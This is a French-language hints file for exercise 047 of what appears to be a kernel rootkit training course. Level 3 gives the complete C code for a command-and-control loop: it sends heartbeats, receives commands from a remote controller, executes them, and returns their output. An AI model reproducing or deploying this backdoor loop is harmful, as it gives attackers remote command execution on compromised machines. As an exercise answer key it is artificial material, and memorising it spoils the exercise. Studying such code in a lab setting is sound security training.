# Hints, exercice 047

## Niveau 1

La boucle suit le pattern: send heartbeat, recv header, parse, recv data,
exec, read output, send response. Chaque etape utilise une fonction helper
deja definie dans le fichier.

## Niveau 2

```c
/* 1. Heartbeat */
total = pack_msg(send_buf, C2_HEARTBEAT, NULL, 0);
ksend(sock, send_buf, total);

/* 2. Recv header */
ret = krecv(sock, recv_buf, C2_HEADER_SIZE);
if (ret <= 0) break;

/* 3. Parse */
unpack_hdr(recv_buf, &msg_type, &msg_len);
```

Apres ca, check msg_type == C2_CMD_REQUEST.

## Niveau 3

```c
/* Send heartbeat */
total = pack_msg(send_buf, C2_HEARTBEAT, NULL, 0);
ksend(sock, send_buf, total);

/* Recv header */
ret = krecv(sock, recv_buf, C2_HEADER_SIZE);
if (ret <= 0)
    break;
unpack_hdr(recv_buf, &msg_type, &msg_len);

if (msg_type == C2_CMD_REQUEST && msg_len > 0 && msg_len < C2_MAX_DATA) {
    krecv(sock, cmd_buf, msg_len);
    cmd_buf[msg_len] = '\0';
    pr_info("rootkitlings/047: exec: %s\n", cmd_buf);
    exec_cmd(cmd_buf);
    ret = read_output(out_buf, sizeof(out_buf));
    if (ret > 0) {
        total = pack_msg(send_buf, C2_CMD_RESPONSE, out_buf, strlen(out_buf));
        ksend(sock, send_buf, total);
    }
} else {
    break;
}
```
